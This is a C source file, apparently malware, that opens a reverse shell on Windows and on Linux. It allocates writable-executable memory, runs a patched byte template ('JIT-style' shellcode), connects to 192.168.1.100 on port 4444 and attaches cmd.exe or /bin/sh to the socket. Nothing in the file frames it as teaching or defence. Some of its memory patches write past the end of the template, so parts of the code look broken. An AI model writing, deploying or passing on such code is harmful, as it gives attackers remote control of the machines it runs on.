#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

/* JIT-style: allocate RWX, copy template, patch IP/port, then use Winsock */
static unsigned char jit_template[] = {
    0x48, 0x31, 0xc0, 0xc3   /* xor eax,eax; ret - placeholder for "JIT" pattern */
};

int main(void) {
    void *jit_mem = VirtualAlloc(NULL, sizeof(jit_template),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!jit_mem) return 1;

    memcpy(jit_mem, jit_template, sizeof(jit_template));
    /* Self-modify: patch bytes at offsets (192.168.1.100, port 4444) */
    memcpy((char *)jit_mem + 0, "\xc0\xa8\x01\x64", 4);
    memcpy((char *)jit_mem + 4, "\x11\x5c", 2);

    ((void (*)(void))jit_mem)();
    VirtualFree(jit_mem, 0, MEM_RELEASE);

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &addr.sin_addr);
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sock);
    WSACleanup();
    return 0;
}
#else
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

unsigned char jit_template[] = {
    0x48, 0x89, 0xf8, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x48, 0x31, 0xf6,
    0x4d, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xc0, 0x6a, 0x29, 0x58,
    0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a, 0x0f, 0x05, 0xc3
};

int main() {
    void *jit_mem = mmap(NULL, sizeof(jit_template),
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_ANON | MAP_PRIVATE, -1, 0);

    memcpy(jit_mem, jit_template, sizeof(jit_template));

    unsigned char *ip_ptr = (unsigned char *)jit_mem + 0x30;
    unsigned char *port_ptr = (unsigned char *)jit_mem + 0x34;

    memcpy(ip_ptr, "\xc0\xa8\x01\x64", 4);
    memcpy(port_ptr, "\x11\x5c", 2);

    int (*jit_socket)() = (int (*)())jit_mem;
    int sock = jit_socket();

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &addr.sin_addr);

    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}
#endif
